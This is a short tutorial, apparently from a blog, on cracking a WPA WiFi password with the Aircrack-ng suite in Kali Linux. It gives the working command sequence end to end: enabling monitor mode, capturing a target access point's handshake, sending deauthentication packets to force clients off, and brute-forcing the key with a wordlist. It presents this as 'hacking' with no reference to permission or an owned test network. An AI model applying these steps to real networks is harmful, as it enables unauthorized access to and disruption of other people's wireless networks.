Hack Wifi Using Aircrack-ng Suite

Let us see how to hack WiFi using Aircrack-ng Suite in Kali Linux.


1.Start up Kali Linux. Open terminal and type airmon-ng to check for the wireless interface device in your system.



2. Then type
airmon-ng start (interface)
To start monitor mode in your wireless interface card.



3. Then type
airodump-ng (interface)
to start scanning for the nearby WiFi access points.



4. After that you can see all the acess points. After the desired acecss point has appeared. Press ctrl+c to stop scanning



5. Then type the command
airodump-ng --bssid (the mac address of access point) -c (channel of access point) --write WPAcrack (interface)



6. After executing the above command the airodump-ng will concentrate on the given mac address and will capture the handshake and store it in WPAcrack file.



7. For capturing the handshake the devices that are connected to the access point must reauthenticate themself to the access point. There is a command aireplay-ng that will send the deauthenticate packets to the device. Type Command
aireplay-ng --deauth 100 -a (mac address of access point) (interface)



8. The above command will deauthenticate the device, Now we should wait till the devices connect back to the access point. After they have sucessfully connected. The airodump-ng will capture the handshake you will now WPA handshake in the top right corner of the airodump-ng screen.



9. Now after capturing the handshake we should decrypt it using aircrack-ng. Type
aircrack-ng WPAcrack-01.cap -w (file location of dictonary text)



10. After some time aircrack-ng will show the key to the access point.
